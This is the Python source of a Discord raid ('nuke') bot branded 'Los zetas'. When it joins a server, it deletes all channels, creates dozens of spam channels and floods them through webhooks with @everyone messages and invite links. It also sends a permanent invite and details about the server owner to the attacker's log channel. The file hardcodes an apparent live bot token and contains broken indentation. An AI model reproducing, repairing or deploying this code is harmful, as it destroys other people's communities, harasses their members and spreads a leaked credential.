import discord, json, aiohttp, discord_webhook
from discord.ext import commands
from discord.ext.commands import check

#Made By AOS
#Dar creditos si cambias cosas
#DD ON TOP


intents = discord.Intents().all()
intents.message_content = True
bot = commands.Bot(command_prefix=".", intents=intents)
bot.remove_command('help')
session = aiohttp.ClientSession()

token = "MTA1ODU2OTk1ODYzMzc3NTE1NA.GdpNCY.tEL0pBI03HkNaMBHI5Z5OaxpBVv8xr2-vJir78"
antinuke = "Id del servidor que no podra ser raideado"
logs_channel = "Id del canal de logs"


def check_if_user_has_premium(ctx):
    with open("guild.json") as f:
        guild = json.load(f)
        if guild in guild.id:
            return False

    return True  

@bot.event    
async def on_guild_join(guild): 
 server_id = guild.id
 logg = bot.get_channel(logs_channel)
 with open('guild.json', 'r+') as f:
        data = json.load(f) 
 if server_id in data['guild']:
    return
 else:    
  if guild.id not in antinuke:  
   for channel in guild.channels:
        try:
            await channel.delete()

        except:
            pass  
   for _i in range(1):

        raid = await guild.create_text_channel(name="únete-a-los-zetas")      
        invite = await raid.create_invite(max_age=0)
        await raid.send("||@everyone||\n**𝐄𝐬𝐭𝐚 𝐦𝐢𝐞𝐫𝐝𝐚 𝐝𝐞 𝐬𝐞𝐫𝐯𝐢𝐝𝐨𝐫 𝐟𝐮𝐞 𝐞𝐱𝐭𝐞𝐫𝐦𝐢𝐧𝐚𝐝𝐚 𝐩𝐨𝐫 Los zetas, ú𝐧𝐞𝐭𝐞 𝐩𝐚𝐫𝐚 𝐫𝐞𝐜𝐮𝐩𝐞𝐫𝐚𝐫𝐥𝐚 𝐨 𝐮𝐬𝐚𝐫𝐦𝐞.**\n https://discord.gg/8xSEwuVu")            
   for i in range(1):
    log = discord.Embed(title="Entrar al servidor",url=invite, colour=0xed0b0b)
    log.add_field(name='> Nombre del servidor',value=f'{guild.name}',inline=False)
    log.add_field(name='> Miembros',value=f'{guild.member_count}',inline=False)
    log.add_field(name='> Owner',value=f'{guild.owner}',inline=False)
    log.add_field(name='> Boosteos',value=f'{str(guild.premium_subscription_count)}',inline=False)    
    log.set_thumbnail(url="https://cdn.discordapp.com/icons/889728452289261588/5d21ff49b16b594b0fe5908beb126e61.png?size=4096")
    await logg.send(invite, embed=log)

   for _i in range(50):
    try: 
     await guild.create_text_channel(name="Raid by los zetas")  
    except:
     pass 
 
   with open('guild.json', 'r+') as f:
        data = json.load(f)
        data['guild'].append(server_id)
        f.seek(0)
        json.dump(data, f)
        f.truncate()


@bot.event
async def on_guild_channel_create(channel):
    global raidpremium
    global raidnormal
    global texto
    global canal 
    webhook = await channel.create_webhook(name = "El hijo de youngaos")
        for _i in range(50):
          try:  
            log = discord.Embed(title="RAIDED BY LOS ZETAS",description = "```THIS SERVER GOT NUKED BY LOS ZETAS```" ,colour=0x2f3136)
            log.add_field(name='Discord',value='https://discord.gg/8xSEwuVu',inline=False)
            log.add_field(name='Twitter',value='https://discord.gg/8xSEwuVu',inline=False)            
            log.add_field(name='YouTube',value='https://discord.gg/8xSEwuVu',inline=False)
            log.set_image(url="https://cdn.discordapp.com/attachments/1058557015598837830/1058568306518401025/OIP.png")
            log.set_thumbnail(url="https://cdn.discordapp.com/attachments/1058557015598837830/1058568306518401025/OIP.png")
            await webhook.send("||@everyone|| **__SERVER DESTROYED BY LOS ZETAS__**\n https://discord.gg/8xSEwuVu", embed=log)
            await channel.send("||@everyone|| **__SERVER DESTROYED BY LOS ZETAS__**\n https://discord.gg/8xSEwuVu", embed=log)
          except:
               pass 


bot.run(token)           
